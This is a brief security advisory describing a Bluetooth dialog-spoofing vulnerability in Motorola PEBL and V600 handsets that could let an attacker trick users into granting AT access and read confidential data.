Motorola mobile handsets are prone to a dialog-spoofing vulnerability when accepting Bluetooth communications. An attacker could exploit this issue to trick a user into granting them AT access to the device. The attacker could then gather confidential information from the handset.

Motorola PEBL and V600 handsets are vulnerable to this issue; other devices may also be affected.
